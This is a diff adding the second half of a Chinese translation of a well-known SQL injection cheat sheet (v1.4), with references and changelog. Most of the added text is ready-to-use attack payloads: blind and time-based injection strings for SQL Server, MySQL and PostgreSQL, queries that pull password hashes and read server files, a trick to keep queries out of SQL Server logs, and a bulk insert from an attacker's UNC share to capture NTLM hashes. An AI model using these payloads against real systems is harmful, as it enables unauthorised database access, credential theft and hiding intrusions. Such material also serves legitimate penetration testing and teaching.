@@ -1,4 +1,5 @@
-# SQL注入速查表
+# SQL注入速查表（上）
+<small>*本文由Yinzo翻译，转载请保留署名。原文地址：[http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell)*</small>
 
 <small>*文档版本：1.4*</small>
 
@@ -496,3 +497,209 @@ RECONFIGURE
 `';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--`
 
 **详情请参考：[Fast way to extract data from Error Based SQL Injections](http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/)**
+
+
+### 盲注
+#### 关于盲注
+一个经过完整而优秀开发的应用一般来说你是**看不到错误提示的**，所以你是没办法从Union攻击和错误中提取出数据的
+
+**一般盲注**，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果
+
+**完全盲注**，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。
+
+在一般盲注下你能够使用**If语句**或者**WHERE查询注入***(一般来说比较简单)*，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用**WAIT FOR DELAY '0:0:10'**，在MySQL中使用**BENCHMARK()**，在PostgreSQL中使用**pg_sleep(10)**，以及在ORACLE中的一些**PL/SQL小技巧**。
+
+#### 实战中的盲注实例
+以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。
+
+**TRUE**和**FALSE**标志代表了查询返回了true或false
+
+
+	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 
+
+	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 
+
+	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 
+
+	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 
+
+	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
+	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 
+
+	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
+
+
+由于上面**后两个查询都是false**，我们能清楚的知道表名的第一个**字符的ASCII码是80，也就是"P"**。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。
+
+### 延时盲注
+首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。
+
+#### `WAITFOR DELAY [time]`(S)
+这就跟`sleep`差不多，等待特定的时间。通过CPU来让数据库进行等待。
+
+`WAITFOR DELAY '0:0:10'--`
+
+你也可以这样用
+
+`WAITFOR DELAY '0:0:0.51'`
+
+#### 实例
++ 俺是sa吗？
+	`if (select user) = 'sa' waitfor delay '0:0:10'`
++ ProductID =`1;waitfor delay '0:0:10'--`
++ ProductID =`1);waitfor delay '0:0:10'--`
++ ProductID =`1';waitfor delay '0:0:10'--`
++ ProductID =`1');waitfor delay '0:0:10'--`
++ ProductID =`1));waitfor delay '0:0:10'--`
++ ProductID =`1'));waitfor delay '0:0:10'--`
+
+#### `BENCHMARK()`(M)
+
+一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。
+`BENCHMARK(howmanytimes, do this)`
+
+#### 实例
++ 俺是root吗？爽！
+	`IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`
+	
++ 判断表是否存在
+	`IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`
+	
+#### `pg_sleep(seconds)`(P)
+睡眠指定秒数。
+
++ `SELECT pg_sleep(10);`睡个十秒
+	
+	
+### 掩盖痕迹
+#### `-sp_password log bypass`(S)
+出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。
+
+### 注入测试
+这些测试既简单又清晰，适用于盲注和悄悄地搞。
+
+1. `product.asp?id=4 (SMO)`
+	1. `product.asp?id=5-1`
+	1. `product.asp?id=4 OR 1=1`
+
+1. `product.asp?name=Book`
+	1. `product.asp?name=Bo’%2b’ok`
+	1. `product.asp?name=Bo’ || ’ok (OM)`
+	1. `product.asp?name=Book’ OR ‘x’=’x`
+
+### 一些其他的MySQL笔记
++ 子查询只能在MySQL4.1+使用
++ 用户
+	+ `SELECT User,Password FROM mysql.user;`
++ `SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;`
++ `SELECT ... INTO DUMPFILE`
+	+ 把查询写入一个**新文件**中(不能修改已有文件)
++ UDF功能
+	+ `create function LockWorkStation returns integer soname 'user32';`
+	+ `select LockWorkStation(); `
+	+ `create function ExitProcess returns integer soname 'kernel32';`
+	+ `select exitprocess();`
++ `SELECT USER();`
++ `SELECT password,USER() FROM mysql.user;`
++ admin密码哈希的第一位
+	+ `SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;`
++ 文件读取
+	+ `query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
++ MySQL读取文件内容
+	+ **默认这个功能是没开启的！**
+
+			create table foo( line blob ); 
+			load data infile 'c:/boot.ini' into table foo; 
+			select * from foo;
++ MySQL里的各种延时
++ `select benchmark( 500000, sha1( 'test' ) );
+query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
++ `select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); `
++ **遍历数据，暴力猜解**
+	+ `select if( (ascii(substring(user(),1,1)) >> 7) & 1,benchmark(100000,sha1('test')), 'false' );`
+
+#### MySQL中好用的函数
+
++ `MD5()`
+	
+	MD5哈希
++ `SHA1()` 
+
+	SHA1哈希
++ `PASSWORD()`
++ `ENCODE()`
++ `COMPRESS()` 
+	
+	压缩数据，在盲注时读取大量数据很好用
++ `ROW_COUNT()`
++ `SCHEMA()`
++ `VERSION()`
+
+	跟`@@version`是一样的
+	
+### SQL注入的高级使用
+一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）
+
+> Name:`' + (SELECT TOP 1 password FROM users ) + '`
+
+> Email : `xx@xx.com`
+
+如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。
+
+#### 强制SQL Server来得到NTLM哈希
+这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain & Abel)捕捉NTLM session。
+
+#### Bulk insert UNC共享文件 (S) 
+`bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'
+
+## 参考资料
+因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请[给我发邮件](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*，我会尽快更新。
+
++ **各种资料**
+	+ [Advanced SQL Injection In SQL Applications](http://www.ngssoftware.com/papers/advanced_sql_injection.pdf), *Chris Anley*
+	+ [More Advanced SQL Injection In SQL Applications](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf), *Chris Anley*
+	+ [Blindfolded SQL Injection, Ofer Maor](http://www.imperva.com/download.asp?id=4) – *Amichai Shulman*
+	+ [Hackproofing MySQL](http://www.ngssoftware.com/papers/HackproofingMySQL.pdf), *Chris Anley*
+	+ [Database Hacker's Handbook, David Litchfield](http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html), *Chris Anley, John Heasman, Bill Grindlay*
+	+ **楼上的团队**！
++ **MSSQL相关**
+	+ MSSQL Operators - http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx
+	+ Transact-SQL Reference - http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx
+	+ String Functions (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms181984.aspx
+	+ List of MSSQL Server Collation Names - http://msdn2.microsoft.com/en-us/library/ms180175.aspx
+	+ MSSQL Server 2005 Login Information and some other functions : [Sumit Siddharth](http://www.notsosecure.com/)
++ **MySQL相关**
+	+ Comments : http://dev.mysql.com/doc/
+	+ Control Flows - http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html
+	+ MySQL Gotchas - http://sql-info.de/mysql/gotchas.htm
+	+ [New SQL Injection Concept](http://www.securiteam.com/securityreviews/5KP0N1PC1W.html), *Tonu Samuel*
+
+## 更新日志
++ 15/03/2007 - Public Release v1.0
++ 16/03/2007 - v1.1
+	+ Links added for some paper and book references
+	+ Collation sample added
+	+ Some typos fixed
+	+ Styles and Formatting improved
+	+ New MySQL version and comment samples
+	+ PostgreSQL Added to Ascii and legends, pg_sleep() added blind section
+	+ Blind SQL Injection section and improvements, new samples
+	+ Reference paper added for MySQL comments
++ 21/03/2007 - v1.2
+	+ BENCHMARK() sample changed to avoid people DoS their MySQL Servers
+	+ More Formatting and Typo
+	+ Descriptions for some MySQL Function
++ 30/03/2007 v1.3
+	+ Niko pointed out PotsgreSQL and PHP supports stacked queries
+	+ Bypassing second MD5 check login screens description and attack added
+	+ Mark came with extracting NTLM session idea, added
+	+ Detailed Blind SQL Exploitation added
++ 13/04/2007 v1.4 - Release
+	+ SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)
+	+ [日文版SQL注入速查表发布](http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html) (*v1.1*)
+
+### To Do / Contact / Help
+
+我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，[给我发邮件吧](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*
